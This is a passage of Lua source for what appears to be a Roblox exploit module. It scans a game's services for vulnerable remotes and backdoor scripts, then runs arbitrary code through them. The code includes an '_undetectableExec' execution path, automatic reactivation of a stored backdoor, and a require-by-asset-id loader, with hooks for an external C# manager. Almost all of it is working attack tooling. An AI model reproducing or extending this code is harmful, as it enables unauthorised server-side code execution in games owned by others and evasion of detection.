            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:GameChanged")
            _bs.Disconnect()
            return
        end
    end)
    
    pcall(function()
        game:BindToClose(function()
            _log("GAME_CLOSING", "LEAVE")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:GameClosed")
            _bs.Disconnect()
        end)
    end)
    
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    
    if localPlayer then
        localPlayer.Destroying:Connect(function()
            _log("PLAYER_DESTROYING", "LEAVE")
            _updateGUIStatus(false)
            _storage.selectedPath = nil
            print("PANS_PLAYER_LEFT:PlayerDestroyed")
            _bs.Disconnect()
        end)
        
        local lastParent = localPlayer.Parent
        localPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
            if localPlayer.Parent == nil and lastParent ~= nil then
                _log("PLAYER_PARENT_NIL", "LEAVE")
                _updateGUIStatus(false)
                _storage.selectedPath = nil
                print("PANS_PLAYER_LEFT:ParentNil")
                _bs.Disconnect()
            end
            lastParent = localPlayer.Parent
        end)
    end
end

local function _stopMonitoring()
    if _bs._monitor then
        pcall(function() _bs._monitor:Disconnect() end)
        _bs._monitor = nil
    end
    if _bs._gameMonitor then
        pcall(function() _bs._gameMonitor:Disconnect() end)
        _bs._gameMonitor = nil
    end
    _bs._currentGameId = nil
end

-- Public API Functions

function _bs.Execute(code)
    if _bs._a and _bs._selected then
        _log("Executing through active backdoor...", "EXEC")
        return _undetectableExec(code)
    end
    
    if _storage.selectedPath then
        _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
        
        local restored = _findBackdoorByPath(_storage.selectedPath)
        if restored then
            _bs._selected = restored
            _bs._a = true
            
            _startMonitoring()
            _updateGUIStatus(true)
            
            _log("Reactivated successfully!", "REACTIVATE")
            return _undetectableExec(code)
        else
            _log("Stored backdoor no longer exists", "REACTIVATE")
            _storage.selectedPath = nil
        end
    end
    
    if _cfg.autoReconnect then
        _log("Attempting quick scan for reactivation...", "REACTIVATE")
        
        local found = _quickScan()
        if found and _bs._selected then
            _bs._a = true
            _startMonitoring()
            _updateGUIStatus(true)
            _log("Quick reactivation successful!", "REACTIVATE")
            return _undetectableExec(code)
        end
    end
    
    _log("Backdoor not active and reactivation failed", "ERROR")
    return false
end

function _bs.Scan()
    _log("Starting scan...", "SCAN")
    _bs._r = {}
    _bs._n = {}
    _bs._m = {}
    _bs._selected = nil
    _bs._backup = {}
    _bs._s = tick()
    
    local services = {}
    local serviceNames = {"ReplicatedStorage", "ReplicatedFirst", "StarterGui", "StarterPack", "StarterPlayer", "Workspace"}
    
    for _, name in ipairs(serviceNames) do
        local ok, svc = pcall(function() return game:GetService(name) end)
        if ok and svc then
            table.insert(services, svc)
        end
    end
    
    local allR = {}
    local allS = {}
    local allM = {}
    
    for _, svc in ipairs(services) do
        local ar, as, am = _scan(svc)
        for _, v in ipairs(ar) do table.insert(allR, v) end
        for _, v in ipairs(as) do table.insert(allS, v) end
        for _, v in ipairs(am) do table.insert(allM, v) end
    end
    
    _log(("Found %d remotes, %d scripts"):format(#allR, #allS), "SCAN")
    
    for _, r in ipairs(allR) do
        if r.Category == "NORMAL" then
            table.insert(_bs._n, r)
        else
            local isV, method, conf = _test(r, 0)
            if isV then
                r.Vulnerable = true
                r.ExecutionMethod = method
                r.Confidence = conf
                table.insert(_bs._r, r)
            else
                table.insert(_bs._n, r)
            end
        end
    end
    
    for _, s in ipairs(allS) do
        if s.IsBackdoor then
            local id = ""
            pcall(function() id = s.Object:GetDebugId() end)
            
            table.insert(_bs._r, {
                Object = s.Object,
                Name = s.Name,
                Type = "ScriptBackdoor",
                Path = s.Path,
                Category = "MALICIOUS",
                Vulnerable = true,
                ExecutionMethod = "script_source",
                Confidence = s.RiskScore,
                ScriptInfo = s,
                InstanceId = id
            })
        end
    end
    
    if #_bs._r > 0 then
        local selected, backup = _selectRandomBackdoor(_bs._r)
        _bs._selected = selected
        _bs._backup = backup
        
        if selected then
            _log(("Selected: %s [%d%%]"):format(selected.Path, selected.Confidence or 0), "SELECT")
        end
    end
    
    for _, m in ipairs(allM) do
        table.insert(_bs._m, m)
    end
    
    return _bs._selected ~= nil, #_bs._n
end

-- C# Compatible: Get all detected backdoors
function _bs.GetAllDetected()
    local all = {}
    
    -- Add remotes
    for _, r in ipairs(_bs._r) do
        table.insert(all, {
            Path = r.Path,
            Category = r.Category or "UNKNOWN",
            Confidence = r.Confidence or 0,
            Type = r.Type,
            ExecutionMethod = r.ExecutionMethod or "unknown",
            Object = r.Object
        })
    end
    
    -- Add scripts
    for _, s in ipairs(_bs._f or {}) do
        if s.IsBackdoor then
            table.insert(all, {
                Path = s.Path,
                Category = "MALICIOUS",
                Confidence = s.RiskScore,
                Type = "ScriptBackdoor",
                ExecutionMethod = "script_source",
                Object = s.Object
            })
        end
    end
    
    table.sort(all, function(a, b) return (a.Confidence or 0) > (b.Confidence or 0) end)
    
    return all
end

-- C# Compatible: Activate specific backdoor
function _bs.ActivateSpecific(path, category)
    _log(string.format("Activating backdoor: %s [%s]", path, category), "EXEC")
    
    -- Try to find by path
    local bd = nil
    for _, r in ipairs(_bs._r) do
        if r.Path == path then
            bd = r
            break
        end
    end
    
    if not bd then
        bd = _findBackdoorByPath(path)
    end
    
    if not bd then
        return false, "Backdoor not found"
    end
    
    _bs._selected = bd
    _bs._a = true
    
    _startMonitoring()
    _updateGUIStatus(true)
    
    return true, "Activated"
end

-- C# Compatible: Scan with internal GUI fallback
function _bs.ScanWithManager(useInternal)
    local found, normalCount = _bs.Scan()
    
    if not found then
        return false, "No backdoors found"
    end
    
    local allBackdoors = _bs.GetAllDetected()
    
    if useInternal or _storage.useInternalGUI then
        _log("Using internal manager GUI", "MANAGER")
        
        local selected = nil
        local done = false
        
        _createInternalManager(allBackdoors, function(result)
            selected = result
            done = true
        end)
        
        while not done do
            wait(0.1)
        end
        
        if selected then
            return _bs.ActivateSpecific(selected.Path, selected.Category)
        else
            return false, "User cancelled"
        end
    else
        for _, bd in ipairs(allBackdoors) do
            print('PANS_BACKDOOR_FOUND:' .. bd.Path .. ':' .. bd.Type .. ':' .. (bd.ExecutionMethod or 'unknown') .. ':' .. bd.Confidence .. ':' .. bd.Category)
        end
        print('BACKDOOR_TOTAL:' .. #allBackdoors)
        print('SCAN_COMPLETE')
        return true, "External manager"
    end
end

function _bs.Require(mid)
    if type(mid) == "number" then mid = tostring(mid) end
    
    local requireCode = ([[
        local s,r=pcall(function()local m=require(%s)return m end)
        if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
    ]]):format(mid)
    
    return _bs.Execute(requireCode)
end

function _bs.Initialize(cb, cfg)
    _bs._cb = cb
    if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
    
    if _storage.selectedPath then
        _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
    end
    
    _log("Initialized (Auto-Reconnect + GUI Enabled)", "INIT")
    return _bs
end

function _bs.Activate()
    if _bs._selected then
        _bs._a = true
        print(("PANS_BACKDOOR_ACTIVE:1:%s:%s"):format(_bs._selected.Path, _bs._selected.Type))
        print(("PANS_BACKDOOR_SELECTED:%s:%s:%s"):format(_bs._selected.Path, _bs._selected.Type, _bs._selected.ExecutionMethod or "direct"))
        
        _createGUI()
        
        _startMonitoring()
        _startGameMonitoring()
        
        _log("Active, monitored, and GUI created", "ACTIVE")
        return true
    end
    _log("No backdoor selected", "ERROR")
    return false
end

function _bs.Disconnect()
    _stopMonitoring()
    _bs._a = false
    _updateGUIStatus(false)
    
    local oldPath = "unknown"
    if _bs._selected then
        oldPath = _bs._selected.Path
    end
    _bs._selected = nil
    print("PANS_BACKDOOR_DISCONNECTED:" .. oldPath)
    _log("Disconnected: " .. oldPath, "DISCONNECT")
end

function _bs.GetStatus()
    return {
        Active = _bs._a,
        HasSelection = _bs._selected ~= nil,
        SelectedPath = _bs._selected and _bs._selected.Path or nil,
        StoredPath = _storage.selectedPath,
        BackupCount = #_bs._backup,
        NormalRemotes = #_bs._n,
        ScanTime = tick() - _bs._s,
        CurrentGameId = _bs._currentGameId,
        HasGUI = _bs._gui ~= nil
    }
end

function _bs.GetSelected()
    return _bs._selected
end

function _bs.GetBackups()
    return _bs._backup
end

function _bs.ToggleGUI()
    if _bs._gui then
        _bs._gui.Enabled = not _bs._gui.Enabled
        return _bs._gui.Enabled
    else
        _createGUI()
        return true
    end
end

function _bs.DestroyGUI()
    if _bs._gui then
        pcall(function() _bs._gui:Destroy() end)
        _bs._gui = nil
        _bs._guiStatusDot = nil
        _bs._guiStatusText = nil
        _log("GUI Destroyed", "GUI")
    end
end

return _bs
